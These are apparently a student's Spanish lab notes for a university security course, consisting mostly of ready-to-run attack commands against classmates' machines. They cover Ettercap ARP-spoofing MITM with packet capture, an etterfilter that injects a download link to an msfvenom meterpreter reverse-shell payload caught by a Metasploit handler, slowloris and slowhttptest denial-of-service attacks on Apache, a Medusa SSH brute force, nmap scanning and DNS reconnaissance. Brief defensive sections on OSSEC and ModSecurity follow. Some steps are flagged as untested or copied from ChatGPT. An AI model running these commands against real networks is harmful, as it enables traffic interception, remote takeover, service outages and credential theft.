# A - Instalar Ettercap

_Nada que hacer_

# B - Ver paqueteria Ettercap

Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados).

1. Hacemos un MITM a la máquina de nuestro compañero:

> `ettercap -T -q -i ens33 -M arp:remote //10.11.49.55/ //10.11.48.1/`

- Para generar trafico se puede usar el siguiente comando: `xdg-open http://www.edu4java.com/es/web/web30.html`.

2. En otra terminal, hacemos un tcpdump para guardar el tráfico capturado en un fichero pcap:

> `tcpdump -i ens33 -s 65535 -w compa.pcap`

3. Desde nuestra máquina local, hacemos un `scp` para obtener el fichero:

> `scp lsi@10.11.49.54:/home/lsi/compa.pcap .`

4. Ejecutamos Wireshark y abrimos el archivo compa.pcap para comenzar a analizar.
### APARTADOS COMPLEMENTARIOS

- Filtre la captura para obtener el tráfico HTTP.

> Escribir en la barra de filtrado.

- Visualice la paquetería TCP de una determinada sesión.

> Ir a `Analyze > Follow > TCP Stream`.

- Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico sobre el tráfico.

> Ir a `Statistics > Protocol Hierarchy`.

- Obtenga información del tráfico de las distintas "conversaciones" mantenidas.

> Ir a `Statistics > Conversations`.

- Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.

> Ir a `Statistics > Endpoints`.

# C - Direcciones MAC

> `nmap -sP 10.11.48.0/23`

# D - Direcciones IPV6

Usamos el script (xd)


> [!warning] 
> PRUEBA ESTO MAÑANA


SCRIPT DE GUIILLEN

```python
import ipaddress

# Abre el archivo con direcciones IPv4 y crea un archivo para las direcciones IPv6
with open('ipv4.txt', 'r') as ipv4_file, open('ipv6_addresses.txt', 'w') as ipv6_file:
    for line in ipv4_file:
        if "Host" in line:  # Filtra solo las líneas que contienen "Host"
            parts = line.split()
            ipv4_address = parts[1]  # La dirección IPv4 está en la segunda columna
            try:
                ipaddress.IPv4Address(ipv4_address)  # Verifica si es una dirección IPv4 válida
                ipv6 = ipaddress.IPv6Address(f'2002::{ipv4_address}')  # Realiza el mapeo a IPv6 con el prefijo 2002
                ipv6_file.write(str(ipv6) + '\n')  # Escribe la dirección IPv6 en el archivo
            except ipaddress.AddressValueError:
                pass  # Ignora las líneas que no son direcciones IPv4 válidas

print("Conversiones completadas. Las direcciones IPv6 se han guardado en ipv6_addresses.txt con el prefijo 2002.")
```

Ahora con este archivo usamos

`sudo nmap -6 -sP -iL archivo.txt`
o
`nmap -6 -sn -iL ipv6_addresses.txt` ← Este no ve los puertos solo si esta encendido, mejor este


Cositas que se inventa chat gpt que no probe (pinta locales) : 

`sudo nmap -6 -sP fe80::/64`



# E - Trafico en Ens33

> `tcpdump -i ens33 -s 65535 -w my.pcap

# F - Spoffing

Mediante `arpspoofing` entre una máquina objeto (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.

- Utilizamos el archivo `pcap` obtenido de la máquina de nuestro compañero.

Se puede ver en _Statistics > HTTP > Requests

# G - MetaSploit


1. Instalamos *Metasplot* siguiente [este tutorial](https://computingforgeeks.com/install-metasploit-framework-on-debian/).
2. Creamos payload:
> `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.48.55 LPORT=5555 -f elf > payload.bin`

3. Lo mejor es subir el payload a tu servidor de apache, mueve el archivo con
> `cp payload.bin /var/www/html/`

4. Creamos `ett.filter`:
> `nano ett.filter`
```bash
if (ip.proto == TCP && tcp.src == 80) {
	replace("a href", "a href=\"http://10.11.49.55/payload.bin\">");
	msg("replaced href.\n");
}
```
5. Configuramos:
> `etterfilter ett.filter -o ig.ef`

6. Activamos el ip_forwarding
> `echo 1 > /proc/sys/net/ipv4/ip_forward`

7. Encendemos el ettercap con el filtro:
> `ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.54/ //10.11.48.1/`

8. Llegados a este punto, desde el cliente vemos la pagina y nos descargamos el virus:
>  `curl example.com

> [!Note]
> Podemos hacer tambien un `curl`, y descargar el link del payload con `wget`.

9. Damos permisos de ejecucion 
> `chmod +x payload.bin`


10. Ejecutamos el virus antes de hacer el exploit
> `./payload.bin`


11. entramos en la consola de metasploit:

> `msfconsole`

```bash
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.11.48.51
set LPORT 5555
set ExitOnSession false
exploit -j -z
```



Ahora estamos dentro del cliente desde el atacante.

> [!Note]
> Usar `sessions 1` si se nos queda pillado 
> Para salir podemos usar: `msf6 exploit(multi/handler) > exit -y`


# H - MITM en IPV6

Haga un MITM en IPv6 y visualice la paquetería.

> `ettercap -6 -T -q -i ens33 -M arp:remote //2002:a0b:3136::1/ //::10.11.48.1/`

>[!Note]  
>El resto funciona como el [segundo apartado](https://github.com/Meleagrista/legislacion-seguridad-informatica/edit/main/practica-2/p2-defensa.md#apartado-b).

# I - Arpon (socorro)

Para vaciar la tabla arp `ip -s -s neigh flush all

> [!note] 
> Para saber si nos han spoofeado, tenemos que correr el comando :
> `ip neigh show`
> Y ver que la gateway es nuestro compañero
> 

> [!important] 
> MATAR ARPON → `ps -A | grep arpon` y luego `kill <process>`
> Para mas seguridad programar reinicio `shutdown -r +10`


# J - Port Scanning y etc

Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre la máquinas del laboratorio de prácticas en IPv4.

> `nmap -A 10.11.48.0/23 > nmap_full.txt`

>[!Warning] 
Es muy lento, quita el A a ver.


1. Realice alguna de las pruebas de port scanning sobre IPv6.

> `nmap -A -6 2002:a0b:3137::1`

>[!Warning] 
Solo la mia?


2. ¿Coinciden los servicios prestados por un sistema con los de IPv4?

> `nmap -A 10.11.49.54` (Si coinciden, 80 y 514)

# K - Informacion Tiempo real

Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.

> `iftop -i ens33`

> `vnstat -l -i ens33`

# L - Prometeus, Node exporter y Grafana

[Tuto](https://medium.com/@ismaelaguilera_/instalaci%C3%B3n-y-configuraci%C3%B3n-de-prometheus-grafana-centos8-331c0e43ccc1)

> Encender prometeus `systemctl start prometheus

Prometeus en `10.11.49.55:9090

> Encender node exporter `systemctl start node_exporter

> Encender Grafana `systemctl start grafana-server

Prometeus en `10.11.49.55:3000

>[!Important]
>Poner la escala de tiempo en 5 min, no en dias como esta por defecto (esto se cambia arriba a la derecha)

# N - Atacar server apache

>[!Important]
>EL OSSEC APAGADO PORSI

#### 1. Slowhttptest

> `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.49.54 -x 24 -p 3`

#### 2. Apache benchmarking

> `ab -n 10000 -c 10000 http://10.11.49.55/`

#### 3. Slowloris Python

> `python3 slowloris.py 10.11.49.54 -s 500`

#### 4. Slowlori Perl


> `perl slowloris.pl -dns 10.11.49.55`

# O - Modsecurity

> [!note]
Para ver la lista de modulos activos usar `apachectl -M`.

> `a2enmod headers`

> `systemctl restart apache2`
### Modsecurity

> `a2enmod security2`

### Evasive

> `a2enmod evasive`

### Qos

> `a2enmod qos`

# P - Info de la UDC

1. Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.

> `whois -h whois.ripe.net UDC`

>[!Warning]
> Mejor usa `host www.udc.es`


2. Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.

**Correo**: 

> `dig udc.es MX`

>[!warning] 
>Si no va usa `nslookup -type=ns udc.es`

**DNS**:

>[!warning] 
>Falta comando usa : `nslookup -type=ns udc.es`

1. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?

- No, tiene la transferencia de zona deshabilitada:

> `dig axfr @zipi.udc.es udc.es.`



>[!Important]  
Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.




4. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.

> `nmap --script hostmap-crtsh.nse udc.es`

5. ¿Qué gestor de contenidos se utiliza en [www.usc.es](http://www.usc.es/)?

> `whatweb www.usc.es`


# Q - Perfiles principales

1. Para hacer OS fingerprinting: `nmap -O --osscan-guess`
2. ``nmap -sL 10.11.48.0/23 #  lista de maquinas activas en la red``
3. ``nmap -sP 10.11.48.0/23 #  lista sistema de red``
4. ``nmap -sV 10.11.48.70 # fingerprinting``
5. ``nmap -sV -p <portnum> 10.11.48.70 # fingerprinting de puerto``

>[!warning] 
> Meti mas comandos porque pense que faltaba alguno, de una fuente que creo fiable

# R - Medusa

>[!Important]
> Comprobar que no esta baneado el compañero de ninguna manera antes

> `medusa -h 10.11.49.54 -u lsi -P passwords.txt -M ssh`

# S - OSSEC

Iniciar

> `/var/ossec/bin/ossec-control start`

Desbanear

> `/var/ossec/active-response/bin/host-deny.sh delete - 10.11.49.55`

> `iptables -D INPUT -s 10.11.49.55 -j DROP`

>[!Note]  
>Se puede ver quien esta baneado con estos comandos: `cat /etc/hosts.deny` y `iptables -L`

Ver registros

> `tail /var/ossec/logs/ossec.log`

> `tail /var/ossec/logs/active-responses.log`

# T - Postmortem

Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.

> `cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a`

> `cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a |/var/ossec/bin/ossec-reportd`

Mi propio codigo para ver los errores por orden es:

```shell
command_to_generate_output="cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a"

(eval "$command_to_generate_output") >> ossec_output.txt

awk '/\(level [0-9]+\)/ {print a[NR-2] "---" a[NR-1] "---" $0 "---" ; next} {a[NR]=$0}' ossec_output.txt | awk -F"\\(level |\\)" '{print "Level: " $2 "---" $0}' | sort>

rm ossec_output.txt
```


>[!Warning] 
>Prueba esto Fer que no lo acabe de probar!
>Creo que el codigo sobra

